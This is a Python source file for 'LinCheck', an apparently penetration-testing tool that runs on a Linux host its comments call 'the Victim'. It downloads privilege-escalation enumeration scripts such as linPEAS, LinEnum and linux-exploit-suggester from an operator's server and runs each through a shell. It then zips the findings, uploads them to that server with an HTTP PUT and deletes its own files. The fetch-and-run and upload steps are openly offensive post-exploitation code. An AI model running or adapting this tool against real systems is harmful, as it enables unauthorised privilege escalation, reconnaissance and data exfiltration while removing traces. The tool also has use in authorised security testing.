import argparse
import sys
import requests
import os
import subprocess
import time
from zipfile import ZipFile
import shutil
import glob


def login():
    print("""
      _,.
           ,''   `.     __....__ 
         ,'        >.-''        ``-.__,)
       ,'      _,''           _____ _,'
      /      ,'           _.:':::_`:-._ 
     :     ,'       _..-''  \`'.;.`-:::`:. 
     ;    /       ,'  ,::'  .\,'`.`. `\::)`  
    /    /      ,'        \   `. '  )  )/ 
   /    /      /:`.     `--`'   \     '`
   `-._/      /::::)             )
      /      /,-.:(   , _   `.-' 
     ;      :(,`.`-' ',`.     ;
    :       |:\`' )      `-.._\ _
    |         `:-(             `)``-._ 
    |           `.`.        /``'      ``:-.-__,
    :           / `:\ .     :            ` \`-
     \        ,'   '}  `.   |
  _..-`.    ,'`-.   }   |`-'    
,'__    `-'' -.`.'._|   | 
    ```--..,.__.(_|.|   |::._
      __..','/ ,' :  `-.|::)_`.
      `..__..-'   |`.      __,' 
                  :  `-._ `  ;
                   \ \   )  /
                   .\ `.   /
                    ::    /
                    :|  ,'
                    :;,' 
                    `'
    LuckyCheck by BlackSnufkin:                                                           
    Thanks to all Other tools that made it happened                                       
    Modular Privesc ToolBox                                                               
    Add or Remove Tools as you want just with 4 lines and 6 lines for make it look good ;)

    """)


parser = argparse.ArgumentParser(description='Example: LinCheck.py -i 127.0.0.1 -b (Basic Scan) ')
parser.add_argument('-i', '--server', type=str, metavar='', required=True, help='The Privesc Server IP.')
group = parser.add_mutually_exclusive_group()
group.add_argument('-b', '--basic', action='store_true', help='Run Basic LinCheck Scan (2 Tools) . ')
group.add_argument('-a', '--advanced', action='store_true', help='Run advanced LinCheck Scan (4 Tools). ')
group.add_argument('-f', '--full', action='store_true', help='Run Full LinCheck Scan (8 Tools). ')
args = parser.parse_args()

SERVER_IP = args.server


def work_space(directory, mode):
    # Create The work Space of the program
    LinCheck_folder = os.getcwd() + '/{}-{}/'.format(directory, mode)
    os.mkdir(LinCheck_folder)
    os.chdir(LinCheck_folder)


def LinCheck(cmd, url, output_file, input_file):
    # Download & run the tools
    # write the output to file
    # Remove the tool form the Victim

    req = requests.get(url)
    if req.status_code == 200:
        file = open(input_file, 'wb')
        file.write(req.content)
        file.close()
    else:
        print("[!] The Privesc Server is Unavailable..\n[-] Bye Bye ... ")
        exit()

    time.sleep(1)
    execute = 'chmod 700 {}'.format(input_file)
    os.popen(execute)
    time.sleep(1)
    with open(output_file, 'w') as report:  # replace 'w' with 'wb' for Python 3
        report.write('\n[$*] Starting {} Report '.format(output_file))
        process = subprocess.Popen(cmd, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
        for line in iter(process.stdout.readline, b''):  # replace '' with b'' for Python 3
            sys.stdout.write(line.decode(encoding='utf-8', errors='ignore'))
            report.write(line.decode(encoding='utf-8', errors='ignore'))
        report.write('\n[$!]Done {} Report '.format(output_file))
        report.close()
        os.remove(input_file)


def edit_and_send(directory, mode):
    # Merge all the output files to one big report
    # Sort the the final report and remove duplicate (Some duplicate lines because the output of the original tool)
    # Zip the folder with all the reports and send it to the Privesc Server with PUT method and cleans al the files

    read_files = glob.glob("*.txt")
    base_name = directory + '-' + mode
    with open("result.txt", "wb") as outfile:
        for f in read_files:
            with open(f, "rb") as infile:
                outfile.write(infile.read())
    lines_seen = set()
    with open("{}-{}-report.txt".format(directory,mode), "w") as output_file:
        for each_line in open("result.txt", "r"):
            if each_line not in lines_seen:
                output_file.write(each_line)
                lines_seen.add(each_line)
    outfile.close()
    output_file.close()
    os.remove('result.txt')
    file_paths = []
    os.chdir('..')
    for root, directories, files in os.walk(base_name):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)

    print('Following files will be zipped:')
    for file_name in file_paths:
        print(file_name)
        time.sleep(0.5)
    with ZipFile(base_name + '.zip', 'w', allowZip64=True) as zip:
        for file in file_paths:
            zip.write(file)
    print('[+] All files zipped successfully!')
    # Send The Zip File
    headers = {'Content-Type': 'text/plain'}
    url = 'http://' + SERVER_IP + ':8200/{}.zip'.format(base_name)
    file = {'file': ('FinelReport', open(base_name + '.zip', 'rb'), 'application/octet-stream')}
    requests.put(url, headers=headers, files=file, verify=False)
    zip.close()
    file['file'] = 'FinelReport', open(base_name + '.zip', 'rb').close(), 'application/octet-stream'
    os.remove(base_name + ".zip")
    shutil.rmtree(base_name)
'''
All The Tools in This Script
'''
def linPEAS(base_url):
    # linPEAS
    # Github: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
    # Author: carlospolop

    linPAES = "./linpeas.sh"
    linPEAS_url = base_url + "linpeas.sh"
    print('\n[+] Running linPEAS Scan ')
    LinCheck(cmd=linPAES, url=linPEAS_url, output_file="linPEAS.txt", input_file="linpeas.sh")
    print('[$] Done winPEAS Scan.\n')


def LinEnum(base_url):
    # LinEnum
    # Github: https://github.com/rebootuser/LinEnum
    # Author: rebootuser

    LinEnum = "./LinEnum.sh"
    LinEnum_url = base_url + "LinEnum.sh"
    print('\n[+] Running LinEnum Scan ')
    LinCheck(cmd=LinEnum, url=LinEnum_url, output_file="LinEnum.txt", input_file="LinEnum.sh")
    print('[$] Done LinEnum Scan.\n')


def PE(base_url):
    # PE-Linux
    # Github: https://github.com/WazeHell/PE-Linux
    # Author: WazeHell

    PE = "./PE.sh"
    PE_url = base_url + "PE.sh"
    print('\n[+] Running PE-Linux Scan ')
    LinCheck(cmd=PE, url=PE_url, output_file="PE-Linux.txt", input_file="PE.sh")
    print('[$] Done PE-Linux Scan.\n')


def lse(base_url):
    # Linux-Smart-Enumeration
    # Github: https://github.com/diego-treitos/linux-smart-enumeration
    # Author: diego-treitos

    lse = "./lse.sh -l2 -i -s pro,usr,sud,fst,sys,sec,ret,net,srv,sof,ctn -p 10"
    lse_url = base_url + "lse.sh"
    print('\n[+] Running Linux-Smart-Enumeration  Scan ')
    LinCheck(cmd=lse, url=lse_url, output_file="Linux-Smart-Enumeration.txt", input_file="lse.sh")
    print('[$] Done Linux-Smart-Enumeration Scan.\n')


def les(base_url):
    # linux-exploit-suggester
    # Github: https://github.com/mzet-/linux-exploit-suggester
    # Author: mzet

    les = "./linux-exploit-suggester.sh --checksec && ./les.sh"
    les_url = base_url + "linux-exploit-suggester.sh"
    print('\n[+] Running linux-exploit-suggester  Scan ')
    LinCheck(cmd=les, url=les_url, output_file="linux-exploit-suggester.txt", input_file="linux-exploit_suggester.sh")
    print('[$] Done linux-exploit-suggester Scan.\n')


def linux_security_test(base_url):
    # linux_security_test
    # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts
    # Author: 1N3@CrowdShield

    linux_security_test = "./linux_security_test detailed  |grep WARNING"
    linux_security_test_url = base_url + "linux_security_test"
    print('\n[+] Running linux_security_test Scan.\n ')
    LinCheck(cmd=linux_security_test, url=linux_security_test_url, output_file="linux_security_test.txt",
             input_file="linux_security_test")
    print('[$] Done linux_security_test Scan.\n')


def linux_privesc(base_url):
    # linux_privesc
    # Author: 1N3@CrowdShield
    # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts

    linux_privesc = "./linux_privesc.sh"
    linux_privesc_url = base_url + "linux_privesc.sh"
    print('\n[+] Running linux_privesc Scan.\n ')
    LinCheck(cmd=linux_privesc, url=linux_privesc_url, output_file="linux_privesc.txt", input_file="linux_privesc.sh")
    print('[$] Done linux_privesc Scan.\n')


def linux_checksec(base_url):
    # linux_checksec
    # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts
    # Author: 1N3@CrowdShield

    linux_checksec = './linux_checksec.sh --kernel &&./linux_checksec.sh --proc-all'
    linux_checksec_url = base_url + 'linux_checksec.sh'
    print('\n[+] Running linux_checksec Scan.\n ')
    LinCheck(cmd=linux_checksec, url=linux_checksec_url, output_file="linux_checksec.txt",
             input_file="linux_checksec.sh")
    print('\n[+] Done linux_checksec Scan.\n ')

def SUID3NUM(base_url):
    # SUID3NUM
    # Github: https://github.com/Anon-Exploiter/SUID3NUM
    # Author: Anon-Exploiter

    suid3num = 'python3 suid3num.py -e'
    suid3num_url = base_url + 'suid3num.py'
    print('\n[+] Running SUID3NUM Scan.\n ')
    LinCheck(cmd=suid3num, url=suid3num_url, output_file="SUID3NUM.txt",
             input_file="suid3num.py")
    print('\n[+] Done SUID3NUM Scan.\n ')



def user_choice(mode):
    user_accept = input('[?] Are you want to Continue (Y/N) ? '.lower())

    while user_accept != 'n' and user_accept != 'y':
        print('[!] Not Valid Option Select (Y or N) ')
        user_accept = input('\n[?] Are you want to Continue (Y/N) ? '.lower())

    if user_accept == 'n':
        print('[!] Deleting All files..')
        os.chdir('..')
        shutil.rmtree(os.uname()[1]+'-{}'.format(mode))
        print('[!] Bye Bye...')
        exit()
    else:
        pass


def main():
    base_url = "http://" + SERVER_IP + ":8200/Privesc_Tools/LinCheck/"

    if len(sys.argv) < 4:
        print("[?] What Type of LinCheck Scan would you like to run? ")
        print(parser.format_help())

    if args.basic:
        login()
        work_space(directory=os.uname()[1], mode='Basic')
        print(
            '[!] Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Basic\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 5 Minutes **\n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Basic')
        start_time = time.time()
        print('[*] Running Basic LinCheck scan')
        linPEAS(base_url)
        LinEnum(base_url)
        SUID3NUM(base_url)
        edit_and_send(directory=os.uname()[1], mode='Basic')
        seconds = time.time() - start_time
        print('[$] Done Basic LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))

    elif args.advanced:
        login()
        work_space(directory=os.uname()[1], mode='Advanced')
        print(
            '[!] Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Advanced\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 9 Minutes **\n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Advanced')
        start_time = time.time()
        print('[+] Running Advanced LinCheck scan')
        linPEAS(base_url)
        LinEnum(base_url)
        les(base_url)
        PE(base_url)
        edit_and_send(directory=os.uname()[1], mode='Advanced')
        seconds = time.time() - start_time
        print('[$] Done Advanced LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))

    elif args.full:
        login()
        work_space(directory=os.uname()[1], mode='Full')
        print(
            '[!] Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 12 Minutes ** \n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Full')
        start_time = time.time()
        print('[+] Running Full LinCheck scan')
        linPEAS(base_url)
        LinEnum(base_url)
        les(base_url)
        linux_checksec(base_url)
        PE(base_url)
        linux_privesc(base_url)
        linux_security_test(base_url)
        lse(base_url)
        SUID3NUM(base_url)
        edit_and_send(directory=os.uname()[1], mode='Full')
        seconds = time.time() - start_time
        print('[$] Done Full LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))

if __name__ == '__main__':
    main()
